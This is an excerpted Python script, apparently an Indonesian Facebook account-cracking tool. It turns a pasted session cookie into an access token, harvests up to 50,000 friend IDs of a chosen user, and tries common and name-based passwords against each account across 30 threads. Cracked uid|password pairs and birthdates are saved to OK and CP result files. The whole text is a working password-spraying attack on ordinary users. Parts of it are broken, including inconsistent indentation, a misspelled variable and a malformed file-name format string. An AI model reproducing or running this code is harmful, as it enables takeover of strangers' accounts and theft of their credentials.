...
def kecuali(error):
    ...
    print(f"{P}[â€¢] python baz.py")
    exit()

###----------[BOT AUTHOR JANGAN DIGANTI ]---------- ###
class bot_author:
    def __init__(self,cookie,token,cookie_mentah):
        self.loop = 0;self.cookie_mentah = cookie_mentah;list_id   = [str(Asep)];self.komen = ['Mantap bang','Semoga langgeng bang sama si Syafaa','Ganteng bangetðŸ’•','GG scnya  bang']
...
def menu():
	...
	if username =="BAZ":
		...
		jalan("[] GAGAL MASUK !!!")
		jalan("ANDA AKAN DI ARAHAN KE FB UNTUK MINTA USERNAME")
...
def log_cookie():
    ...
    cookie=str(input(f"{P}[!] Masukan cookie : {P}"))
    try:
        token = clotox(cookie)
        coki = {'cookie':cookie}
...
def login():
    ...
    if pp in ["1","01"]:
      ...
      print(f'{B}[+] Terima Kasih Telah Memilih SC Ini Sebagai Pilihan Terpercayamu. Jangan Lupa Berikan Penilaian Terbaik Di Github Ya! Thank You!!{B}- BAZ -')
      print(f'{B}[+] Dengan Log Out Maka Seluruh Data Login Akan Terhapus. Berikut Adalah Data Yang Akan Dihapus :{B}[â€¢]{P}Token/Cookies')
      input(f'{B}[+][{P}Enter Untuk Log Out{M}]')
      try:shutil.rmtree('login')
      except:pass
      exit()
    else:print(f'{M}[!] Isi Yang Benar Njink!!');menu()
...
def massal():
    ...
    try:
        ...
        tanya_total = int(input(f"{B}[â€¢] Masukkan jumlah id : {P}"))
...
def publik():
    try:
        ...
        print(f"{B}[â€¢]{M} cookie modar dinggo wae ");exit()
    _id_=input(f"{B}[â€¢] Masukkan user id : {B}")
    try:
        url= requests.Session().get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(_id_,token),cookies=cookie)
        z=json.loads(url.text)
        for i in z['friends']['data']:
...
def userset():
    ...
    if _pil_ in ["1","01"]:
        lololr=input(f"{B}[â€¢] Masukkan user agent \n{P}[â€¢] Masukan di sini : {B}")
        try:
...
def cek_hasil():
    ...
    print(f"{B}[â€¢] Contoh untuk masukan file : {B}CP/{tanggal}.json")
...
def fii_xd():
	...
	if fiisayangwidiya in [""]:
				...
				with ThreadPoolExecutor(max_workers=30) as coeg:
					...
					for user in id:
						...
						if len(frist)>=6:
							...
							fii = [ "bismillah", "anjing", "indonesia", "sayangkamu" ]
		...
		print(f"{B}[â€¢]{M} Terkadang jika menampilkan opsi jarang dapet akun !!!")
		_checkoptions_=input(f"{B}[â€¢] Pilih : {P}")
		if _checkoptions_ in ["y","Y"]:
			try:
				_key = "Anjink"
...
def started():
    jalan(f"{B}[â€¢]{P} Results {H}OK {P}tersimpan di {H}OK/{tanggal}")
    jalan(f"{B}[â€¢]{P} Results {K}CP {P}tersimpan di {K}CP/{tanggal}")
    jalan(f"{B}[â€¢] Jika tidak ada hasil mainkan mode pesawat")
    jalan(f"{B}[â€¢] Butuh kesabaran ngab Crack nya mayan lambat")
    print(f"{P}================================================={P}")
...
def api(uid, fii):
    ...
    sys.stdout.write(f"\r{J}[â€¢] BAZ > {P} {loop}/{len(id)} {K}CP : {K}{len(cp)} {H}OK : {H}{len(ok)}");sys.stdout.flush()
    for pw in fii:
        pw = pw.lower()
        ...
        if "session_key" in send.text and "EAAA" in send.text:
            ...
            try:
                ...
                month = _bulan_[month]
                print(f"\r{J}----> {H}{uid}â€¢{pw}â€¢{day} {month} {year}")
    ...
    for pw in fii:
        ...
        if "session_key" in send.text and "EAAA" in send.text:
            ...
            try:
                ...
                month, day, year = ttl.split("/")
                month = _bulan_[month]
                print(f"\r{J}----> {H}{uid}â€¢{pw}â€¢{day} {mont} {year}")
                cp.append("%s|%s"%(uid, pw))
                open("OK/%s.json%"(tanggal),"a").write("%s|%s|%s %s %s\n"%(uid, pw, day, month, year))
                break
            except (KeyError, IOError):
		...
		if "c_user" in ses.cookies.get_dict().keys():
			...
			try:
				...
				with requests.Session() as ses:
					...
					month, day, year = ttl.split("/")
					month = bulan_ttl[month]
					print(f"\r{J}----> {K}{uid}â€¢{pw}â€¢{day} {month} {year}")
					cp.append("%s|%s"%(uid, pw))
